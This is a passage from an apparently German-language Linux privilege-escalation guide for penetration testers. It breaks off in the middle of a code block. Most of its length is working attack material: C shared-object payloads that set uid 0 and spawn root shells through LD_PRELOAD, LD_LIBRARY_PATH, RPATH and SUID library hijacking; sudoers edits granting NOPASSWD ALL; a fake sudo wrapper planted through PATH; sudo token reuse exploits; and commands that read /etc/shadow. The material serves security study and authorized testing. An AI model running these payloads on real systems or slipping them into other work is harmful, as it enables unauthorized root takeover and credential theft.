Beachten Sie, dass Sie, wenn Sie Schreibberechtigungen über den Docker-Socket haben, weil Sie **in der Gruppe `docker`** sind, [**weitere Möglichkeiten haben, Berechtigungen zu eskalieren**](interesting-groups-linux-pe/#docker-group). Wenn die [**Docker-API auf einem Port lauscht, können Sie sie auch kompromittieren**](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Überprüfen Sie **weitere Möglichkeiten, aus Docker auszubrechen oder es zu missbrauchen, um Berechtigungen zu eskalieren** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) Privilege Escalation

Wenn Sie feststellen, dass Sie den **`ctr`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Berechtigungen zu eskalieren**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** Privilege Escalation

Wenn Sie feststellen, dass Sie den **`runc`**-Befehl verwenden können, lesen Sie die folgende Seite, da **Sie ihn möglicherweise missbrauchen können, um Berechtigungen zu eskalieren**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **Inter-Process Communication (IPC)-System**, das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Entwickelt mit dem modernen Linux-System im Hinterkopf, bietet es ein robustes Framework für verschiedene Formen der Anwendungs­kommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **erweiterte UNIX-Domänen-Sockets**. Darüber hinaus unterstützt es das Senden von Ereignissen oder Signalen, was eine nahtlose Integration zwischen Systemkomponenten fördert. Beispielsweise kann ein Signal von einem Bluetooth-Dämon über einen eingehenden Anruf einen Musikplayer zum Stummschalten veranlassen und so die Benutzererfahrung verbessern. Darüber hinaus unterstützt D-Bus ein Remote-Objektsystem, das Serviceanfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **Zulassen/Verweigern-Modell**, das die Berechtigungen für Nachrichten (Methodenaufrufe, Signalausgaben usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinien verwaltet. Diese Richtlinien legen Interaktionen mit dem Bus fest und ermöglichen möglicherweise eine Berechtigungseskalation durch die Ausnutzung dieser Berechtigungen.

Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird bereitgestellt, die Berechtigungen für den Root-Benutzer zum Besitzen, Senden an und Empfangen von Nachrichten von `fi.w1.wpa_supplicant1` festlegt.

Richtlinien ohne einen spezifizierten Benutzer oder eine Gruppe gelten universell, während Richtlinien im "default"-Kontext für alle gelten, die nicht von anderen spezifischen Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahren Sie, wie Sie hier eine D-Bus-Kommunikation aufzählen und ausnutzen können:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Netzwerk**

Es ist immer interessant, das Netzwerk aufzuzählen und die Position der Maschine herauszufinden.

### Generische Aufzählung
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfen Sie immer die Netzwerkdienste, die auf dem Gerät ausgeführt werden, mit denen Sie vor dem Zugriff nicht interagieren konnten:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Überprüfen Sie, ob Sie den Datenverkehr sniffen können. Wenn Sie dies können, könnten Sie in der Lage sein, einige Anmeldeinformationen abzufangen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Aufzählung

Überprüfen Sie **wer** Sie sind, welche **Berechtigungen** Sie haben, welche **Benutzer** sich im System befinden, wer sich **anmelden** kann und welche Benutzer **Root-Berechtigungen** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Fehler betroffen, der es Benutzern mit **UID > INT\_MAX** ermöglicht, Privilegien zu eskalieren. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitieren** Sie es mit: **`systemd-run -t /bin/bash`**

### Gruppen

Überprüfen Sie, ob Sie **Mitglied einer Gruppe** sind, die Ihnen Root-Rechte gewähren könnte:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Zwischenablage

Überprüfen Sie, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn Sie **ein Passwort** der Umgebung **kennen, versuchen Sie, sich als jeden Benutzer** mit dem Passwort anzumelden.

### Su-Brute

Wenn es Ihnen nichts ausmacht, viel Lärm zu machen und die Binärdateien `su` und `timeout` auf dem Computer vorhanden sind, können Sie versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht auch, Benutzer mit dem Parameter `-a` zu brute-forcen.

## Missbrauch von beschreibbaren PATHs

### $PATH

Wenn Sie feststellen, dass Sie **in einem Ordner des $PATH schreiben können**, können Sie Berechtigungen eskalieren, indem Sie **eine Hintertür im beschreibbaren Ordner erstellen** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der vor Ihrem beschreibbaren Ordner im $PATH liegt**.

### SUDO und SUID

Sie könnten berechtigt sein, einen Befehl mit sudo auszuführen oder sie könnten das suid-Bit haben. Überprüfen Sie es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration könnte einem Benutzer erlauben, einen Befehl mit den Privilegien eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Im diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen, es ist nun trivial, eine Shell zu erhalten, indem ein SSH-Schlüssel in das Root-Verzeichnis hinzugefügt wird oder indem `sh` aufgerufen wird.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH-Hijacking**, um eine beliebige Python-Bibliothek zu laden, während das Skript als Root ausgeführt wird:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo-Ausführung umgeht Pfade

**Springe**, um andere Dateien zu lesen oder **Symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **Platzhalter** (\*) verwendet wird, ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binary ohne Befehlspfad

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** erteilt wird: _hacker10 ALL= (root) less_, kann dies ausgenutzt werden, indem die PATH-Variable geändert wird.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn eine **suid**-Binärdatei **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (überprüfen Sie immer mit** _**strings**_ **den Inhalt einer seltsamen SUID-Binärdatei)**.

[Beispiele für Payloads zur Ausführung.](payloads-to-execute.md)

### SUID-Binärdatei mit Befehlspfad

Wenn die **suid**-Binärdatei **einen anderen Befehl unter Angabe des Pfads ausführt**, können Sie versuchen, eine Funktion zu **exportieren**, die den Namen des Befehls hat, den die suid-Datei aufruft.

Zum Beispiel, wenn eine suid-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, müssen Sie versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Die Umgebungsvariable **LD\_PRELOAD** wird verwendet, um eine oder mehrere gemeinsam genutzte Bibliotheken (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Vorgang wird als Vorladen einer Bibliothek bezeichnet.

Um jedoch die Systemsicherheit aufrechtzuerhalten und zu verhindern, dass diese Funktion insbesondere bei **suid/sgid**-Ausführbaren ausgenutzt wird, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD\_PRELOAD** für ausführbare Dateien, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Für ausführbare Dateien mit suid/sgid werden nur Bibliotheken in Standardpfaden vorabgeladen, die ebenfalls suid/sgid sind.

Eine Privilegieneskalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env\_keep+=LD\_PRELOAD** enthält. Diese Konfiguration ermöglicht es der Umgebungsvariable **LD\_PRELOAD**, fortzubestehen und erkannt zu werden, selbst wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung von beliebigem Code mit erhöhten Berechtigungen führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern Sie als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompilieren Sie es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **Berechtigungen eskalieren** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Eine ähnliche Privilege Escalation kann missbraucht werden, wenn der Angreifer die **LD\_LIBRARY\_PATH** Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID-Binary – .so-Injektion

Wenn Sie auf eine Binärdatei mit **SUID**-Berechtigungen stoßen, die ungewöhnlich erscheint, ist es eine gute Praxis zu überprüfen, ob sie **.so**-Dateien ordnungsgemäß lädt. Dies kann überprüft werden, indem Sie den folgenden Befehl ausführen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Datei oder Verzeichnis nicht gefunden)"_ auf ein mögliches Ausnutzungspotenzial hin.

Um dies auszunutzen, würde man fortfahren, indem man eine C-Datei erstellt, sagen wir _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt darauf ab, nach dem Kompilieren und Ausführen Berechtigungen zu erhöhen, indem Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten ausgeführt werden.

Kompilieren Sie die obige C-Datei in eine Shared Object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei das Exploit auslösen und einen potenziellen Systemkompromiss ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nun, da wir eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Ordner lädt, in den wir schreiben können, erstellen wir die Bibliothek in diesem Ordner mit dem erforderlichen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die von Ihnen generierte Bibliothek eine Funktion namens `a_function_name` haben muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binärdateien, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, jedoch für Fälle, in denen Sie **nur Argumente in einem Befehl einschleusen können**.

Das Projekt sammelt legitime Funktionen von Unix-Binärdateien, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Berechtigungen zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten und andere Aufgaben nach der Ausnutzung auszuführen.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Wenn Sie auf `sudo -l` zugreifen können, können Sie das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu überprüfen, ob es eine Möglichkeit gibt, eine sudo-Regel auszunutzen.

### Wiederverwendung von Sudo-Token

In Fällen, in denen Sie **sudo-Zugriff** haben, aber nicht das Passwort, können Sie Berechtigungen eskalieren, indem Sie **auf die Ausführung eines sudo-Befehls warten und dann das Sitzungstoken übernehmen**.

Anforderungen zur Eskalation von Berechtigungen:

* Sie haben bereits eine Shell als Benutzer "_sampleuser_"
* "_sampleuser_" hat **`sudo` verwendet**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das es uns ermöglicht, `sudo` ohne Eingabe eines Passworts zu verwenden)
* `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
* `gdb` ist zugänglich (Sie können es hochladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft ändern, indem Sie `/etc/sysctl.d/10-ptrace.conf` modifizieren und `kernel.yama.ptrace_scope = 0` festlegen)

Wenn all diese Anforderungen erfüllt sind, **können Sie Berechtigungen eskalieren, indem Sie:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* Der **erste Exploit** (`exploit.sh`) erstellt die Binärdatei `activate_sudo_token` in _/tmp_. Sie können sie verwenden, um **das sudo-Token in Ihrer Sitzung zu aktivieren** (Sie erhalten nicht automatisch eine Root-Shell, führen Sie `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, **die root gehört und setuid ist**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Der **dritte Exploit** (`exploit_v3.sh`) wird eine **sudoers-Datei erstellen**, die **sudo-Token ewig macht und allen Benutzern die Verwendung von sudo ermöglicht**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Benutzername>

Wenn Sie **Schreibberechtigungen** im Ordner oder auf einer der erstellten Dateien im Ordner haben, können Sie das Binärprogramm [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) verwenden, um **einen sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Wenn Sie beispielsweise die Datei _/var/run/sudo/ts/beispielbenutzer_ überschreiben können und eine Shell als dieser Benutzer mit der PID 1234 haben, können Sie **sudo-Berechtigungen erhalten**, ohne das Passwort zu kennen, indem Sie Folgendes ausführen:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien innerhalb von `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.  
**Wenn** du **diese Datei lesen** kannst, könntest du in der Lage sein, **interessante Informationen zu erhalten**, und wenn du **eine Datei schreiben** kannst, wirst du in der Lage sein, **Berechtigungen zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binär wie `doas` für OpenBSD, denken Sie daran, die Konfiguration unter `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn Sie wissen, dass ein **Benutzer normalerweise eine Verbindung zu einer Maschine herstellt und `sudo` verwendet**, um Berechtigungen zu eskalieren, und Sie eine Shell im Kontext dieses Benutzers haben, können Sie **eine neue sudo-Ausführbare erstellen**, die Ihren Code als Root ausführt und dann den Befehl des Benutzers. Dann **ändern Sie den $PATH** des Benutzerkontexts (zum Beispiel durch Hinzufügen des neuen Pfads in .bash\_profile), damit beim Ausführen von sudo der von Ihnen erstellte sudo-Ausführbare ausgeführt wird.

Beachten Sie, dass wenn der Benutzer eine andere Shell verwendet (nicht bash), müssen Sie andere Dateien ändern, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) ändert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel finden Sie in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Oder führen Sie etwas wie aus:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsam genutzte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien von `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel enthält der Inhalt von `/etc/ld.so.conf.d/libc.conf` den Pfad `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn **ein Benutzer aus irgendeinem Grund Schreibberechtigungen** für einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner innerhalb der Konfigurationsdatei in `/etc/ld.so.conf.d/*.conf`, könnte er Berechtigungen eskalieren.\
Schauen Sie sich an, **wie diese Fehlkonfiguration ausgenutzt werden kann**, auf der folgenden Seite:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch Kopieren der Bibliothek in `/var/tmp/flag15/` wird sie vom Programm an diesem Ort verwendet, wie im `RPATH`-Variablen angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dann erstellen Sie eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux-Fähigkeiten bieten einem Prozess eine **Teilmenge der verfügbaren Root-Privilegien**. Dadurch werden Root-**Privilegien in kleinere und unterscheidbare Einheiten** aufgeteilt. Jede dieser Einheiten kann dann unabhängig an Prozesse vergeben werden. Auf diese Weise wird der vollständige Satz von Privilegien reduziert, was die Risiken von Ausnutzungen verringert.\
Lesen Sie die folgende Seite, um **mehr über Fähigkeiten zu erfahren und wie man sie missbrauchen kann**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "Ausführen"**, dass der betroffene Benutzer in den Ordner "**cd**" kann.\
Das **"Lesen"**-Bit bedeutet, dass der Benutzer die **Dateien auflisten** kann, und das **"Schreiben"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Zugriffssteuerungslisten (ACLs) stellen die sekundäre Ebene der discretionary Berechtigungen dar und sind in der Lage, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Datei- oder Verzeichniszugriff, indem sie spezifischen Benutzern, die nicht die Besitzer oder Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität gewährleistet eine präzisere Zugriffsverwaltung**. Weitere Details finden Sie [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Geben Sie** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dateien mit spezifischen ACLs vom System** erhalten:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Öffnen von Shell-Sitzungen

In **alten Versionen** könnten Sie möglicherweise eine **Shell-Sitzung** eines anderen Benutzers (**root**) **übernehmen**.\
In **neuesten Versionen** können Sie nur auf Bildschirmsitzungen Ihres **eigenen Benutzers** **zugreifen**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung finden**.

### Übernahme von Bildschirmsitzungen

**Liste Bildschirmsitzungen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**An eine Sitzung anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-Sitzungen kapern

Dies war ein Problem mit **alten tmux-Versionen**. Ich konnte keine tmux (v2.1)-Sitzung, die von root erstellt wurde, als nicht privilegierter Benutzer kapern.

**Liste tmux-Sitzungen**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**An eine Sitzung anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Überprüfen Sie die **Valentine-Box von HTB** für ein Beispiel.

## SSH

### Debian OpenSSL Vorhersehbarer PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generiert wurden, können von diesem Fehler betroffen sein.\
Dieser Fehler tritt auf, wenn ein neuer SSH-Schlüssel in diesen Betriebssystemen erstellt wird, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **mit dem öffentlichen SSH-Schlüssel nach dem entsprechenden privaten Schlüssel gesucht werden kann**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

* **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Standardmäßig ist es `no`.
* **PubkeyAuthentication:** Gibt an, ob die Authentifizierung über öffentliche Schlüssel erlaubt ist. Standardmäßig ist es `yes`.
* **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt es an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenfolgen zulässt. Standardmäßig ist es `no`.

### PermitRootLogin

Gibt an, ob sich der Root-Benutzer über SSH anmelden kann, standardmäßig ist es `no`. Mögliche Werte:

* `yes`: Root kann sich mit Passwort und privatem Schlüssel anmelden
* `without-password` oder `prohibit-password`: Root kann sich nur mit einem privaten Schlüssel anmelden
* `forced-commands-only`: Root kann sich nur mit einem privaten Schlüssel anmelden und wenn die Befehlsoptionen angegeben sind
* `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es können Platzhalter wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Benutzer-Home** angeben. Zum Beispiel:
```bash
